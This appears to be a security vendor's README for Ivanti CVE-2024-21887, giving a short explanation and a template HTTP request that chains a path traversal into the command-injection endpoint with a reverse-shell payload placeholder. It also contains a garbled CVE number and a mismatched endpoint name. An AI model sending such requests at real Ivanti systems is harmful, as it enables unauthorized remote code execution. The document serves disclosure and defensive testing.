# Ivanti CVE-2024-21887 PoC Exploit
CISA issued an emergency directive on Ivanti CVE-2024-21887 vulnerability. The agency also reported that CVE-2024-21887 pose unacceptable risks to many federal agencies and should be mitigated immediately.<br><br>
In this repo, Picus provides Proof-of-Concept exploit for the CVE-2024-21887 vulnerability.

Test security controls against the CVE-2024-21887 vulnerability exploit 
--------------------------------------
Picus can help you simulate the CVE-2024-21887 vulnerability exploits for free. No setup or signup required.<br>
Use [Picus Emerging Threat Simulator](https://insights.picussecurity.com/emerging-threat-simulator-announcement?utm_source=github&utm_medium=organic+social&utm_campaign=PLS+Offensive+-+ET+Simulator) and test your defenses in a few clicks.<br> 

If you are looking for more detailed information check out our blog post: [Ivanti CVE-2023-46805 and CVE-2024-21887 Zero-Day Vulnerabilities Actively Exploited](https://www.picussecurity.com/resource/blog/ivanti-cve-2023-46805-and-cve-2024-21887-zero-day-vulnerabilities)


CVE-2024-21887 Proof-of-concept (POC)
----------------------
Ivanti CVE-2024-21887 vulnerability is a command injection vulnerability found in "/api/v1/license/key-status/<path:node_name>" API endpoint.<br> 
Adversaries were able to access this endpoint using the CVE-20203-46805 vulnerability and append their payload to be executed by the vulnerable Ivanti product.<br>
The example HTTP GET request below exploits CVE-2023-46805 vulnerability to view system information without authentication.

#### Example CVE-2024-21887 Exploit:
```http
GET /api/v1/totp/user-backup-code/../../license/keys-status/<url_encoded_python_reverse_shell> 
HTTP/1.1 Host: <IP_Vulnerable_Ivanti_Product>
```

Disclaimer
----------
We do not have any disclamer.
